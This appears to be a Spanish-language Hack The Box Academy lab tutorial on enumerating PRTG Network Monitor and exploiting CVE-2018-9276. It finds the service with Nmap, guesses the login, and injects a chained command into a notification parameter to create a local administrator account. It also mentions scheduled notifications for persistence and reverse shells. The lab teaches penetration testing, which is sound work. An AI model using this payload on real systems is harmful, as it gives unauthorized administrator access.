---
tags:
  - Enumeración
---
[Monitor de red PRTG](https://www.paessler.com/prtg) es un software de monitor de red sin agente. Se puede usar para monitorear el uso del ancho de banda, el tiempo de actividad y recopilar estadísticas de varios hosts, incluidos enrutadores, conmutadores, servidores y más. La primera versión de PRTG fue lanzada en 2003. En 2015 se lanzó una versión gratuita de PRTG, restringida a 100 sensores que se pueden usar para monitorear hasta 20 hosts. Funciona con un modo de descubrimiento automático para escanear áreas de una red y crear una lista de dispositivos. Una vez que se crea esta lista, puede recopilar más información de los dispositivos detectados utilizando protocolos como ICMP, SNMP, WMI, NetFlow y más. Los dispositivos también pueden comunicarse con la herramienta a través de una API REST. El software se ejecuta completamente desde un sitio web basado en AJAX, pero hay una aplicación de escritorio disponible para Windows, Linux y macOS. Algunos datos interesantes sobre PRTG:

- Según la compañía, es utilizado por 300.000 usuarios en todo el mundo
- La compañía que fabrica la herramienta, Paessler, ha estado creando soluciones de monitoreo desde 1997
- Algunas organizaciones que usan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven y [más](https://www.paessler.com/company/casestudies)

Con los años, PRTG ha sufrido de [26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) a eso se les asignaron CVE. De todos estos, solo cuatro tienen PoC de explotación pública fáciles de encontrar, dos secuencias de comandos en sitios cruzados (XSS), una Denegación de servicio y una vulnerabilidad de inyección de comandos autenticada que cubriremos en esta sección. Es raro ver PRTG expuesto externamente, pero a menudo nos hemos encontrado con PRTG durante las pruebas de penetración interna. El cuadro de liberación semanal HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) vitrinas PRTG.

---

### Descubrimiento/Footprinting/Enumeración

Podemos descubrir rápidamente PRTG a partir de un escaneo Nmap. Por lo general, se puede encontrar en puertos web comunes como 80, 443 u 8080. Es posible cambiar el puerto de la interfaz web en la sección Configuración cuando se inicia sesión como administrador.

```shell
sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

Desde el escaneo Nmap anterior, podemos ver el servicio `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detectado en el puerto 8080.

PRTG también aparece en el escaneo EyeWitness que realizamos anteriormente. Aquí podemos ver que EyeWitness enumera las credenciales predeterminadas `prtgadmin:prtgadmin`. Por lo general, están precargados en la página de inicio de sesión y, a menudo, los encontramos sin cambios. Los escáneres de vulnerabilidad como Nessus también tienen [plugins](https://www.tenable.com/plugins/nessus/51874) que detectan la presencia de PRTG.

![Página de inicio de sesión de PRTG Network Monitor con credenciales predeterminadas 'prtgadmin/prtgadmin' mostradas, detalles del servidor y código de respuesta 200.](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Una vez que hayamos descubierto PRTG, podemos confirmar navegando a la URL y se nos presenta la página de inicio de sesión.

![Página de inicio de sesión de PRTG Network Monitor con campos para nombre de usuario y contraseña, credenciales predeterminadas 'prtgadmin/prtgadmin' y sección de blog de Paessler.](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

A partir de la enumeración que realizamos hasta ahora, parece ser la versión PRTG `17.3.33.2830` y es probable que sea vulnerable a [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) que es una inyección de comandos autenticada en la consola web PRTG System Administrator para PRTG Network Monitor en versiones anteriores a la 18.2.39. Según la versión reportada por Nmap, podemos suponer que estamos tratando con una versión vulnerable. Usando `cURL` podemos ver que el número de versión es de hecho `17.3.33.283`.

```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

Nuestro primer intento de iniciar sesión con las credenciales predeterminadas falla, pero algunos intentos más tarde, estamos en `prtgadmin:Password123`.

![Panel de control de PRTG Network Monitor que muestra opciones para ver resultados, obtener soporte, instalar aplicaciones, descargar consolas, alarmas actuales con 5 problemas, tickets abiertos, advertencia SSL, resumen de actividad y estado de la licencia con 4 días de prueba restantes.](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

---

### Aprovechamiento de Vulnerabilidades Conocidas

Una vez que haya iniciado sesión, podemos explorar un poco, pero sabemos que esto es probablemente vulnerable a una falla de inyección de comandos, así que vamos a hacerlo. Esto excelente [entrada de blog](https://www.codewatch.org/blog/?p=453) por el individuo que descubrió este defecto hace un gran trabajo de caminar a través del proceso de descubrimiento inicial y cómo lo descubrieron. Al crear una nueva notificación, el `Parameter` el campo se pasa directamente a un script de PowerShell sin ningún tipo de desinfección de entrada.

Para empezar, el ratón se acabó `Setup` en la parte superior derecha y luego en el `Account Settings` menú y finalmente haga clic en `Notifications`.

![Página de configuración de la cuenta de PRTG Network Monitor que muestra la pestaña de notificaciones con opciones para notificaciones de correo electrónico y tickets, y controles para probar, pausar, editar, clonar o eliminar notificaciones.](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

A continuación, haga clic en `Add new notification`.

![Agregue la página de notificación en PRTG Network Monitor que muestra la configuración del nombre de notificación 'pwn', el estado iniciado, la programación de ninguno y el método de resumen para enviar primero el mensaje ABAJO y ARRIBA ASAP, luego resuma.](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Dé un nombre a la notificación y desplácese hacia abajo y marque la casilla junto a `EXECUTE PROGRAM`. Bajo `Program File`, seleccione `Demo exe notification - outfile.ps1` desde el menú desplegable. Finalmente, en el campo de parámetros, ingrese un comando. Para nuestros propósitos, agregaremos un nuevo usuario administrador local ingresando `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. Durante una evaluación real, es posible que deseemos hacer algo que no cambie el sistema, como obtener un shell inverso o una conexión a nuestro C2 favorito. Finalmente, haga clic en el `Save` botón.

![Configuración de notificaciones con opciones para enviar correo electrónico, notificación push, SMS y ejecutar programa con parámetros para 'Demo exe notification - outfile.ps1'.](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Después de hacer clic `Save`, seremos redirigidos al `Notifications` página y ver nuestra nueva notificación nombrado `pwn` en la lista.

![Configuración de la cuenta de PRTG Network Monitor que muestra la lista de notificaciones con opciones para probar, pausar, editar, clonar o eliminar notificaciones, todas marcadas como activas.](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Ahora, podríamos haber programado la notificación para que se ejecute (y ejecute nuestro comando) en un momento posterior al configurarla. Esto podría resultar útil como mecanismo de persistencia durante un compromiso a largo plazo y vale la pena tomar nota. Los horarios se pueden modificar en el menú de configuración de la cuenta si queremos configurarlo para que se ejecute a una hora específica todos los días para recuperar nuestra conexión o algo de esa naturaleza. En este punto, todo lo que queda es hacer clic en el `Test` botón para ejecutar nuestra notificación y ejecutar el comando para agregar un usuario administrador local. Después de hacer clic `Test` obtendremos una ventana emergente que dice `EXE notification is queued up`. Si recibimos algún tipo de mensaje de error aquí, podemos volver atrás y verificar la configuración de notificación.

Dado que se trata de una ejecución de comandos a ciegas, no recibiremos ningún comentario, por lo que tendríamos que revisar a nuestro oyente para obtener una conexión o, en nuestro caso, verificar si podemos autenticarnos en el host como administrador local. Podemos usar `CrackMapExec` para confirmar el acceso de administrador local. También podríamos intentar RDP a la caja, acceder a través de WinRM o usar una herramienta como [malvado-winrm](https://github.com/Hackplayers/evil-winrm) o algo de la [embaque](https://github.com/SecureAuthCorp/impacket) kit de herramientas como `wmiexec.py` o `psexec.py`.

```shell
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

¡Y confirmamos el acceso de administrador local en el objetivo! Trabaje a través del ejemplo y replique todos los pasos por su cuenta contra el sistema de destino. Desafíate a ti mismo para aprovechar también la vulnerabilidad de inyección de comandos para obtener una conexión de shell inversa del objetivo.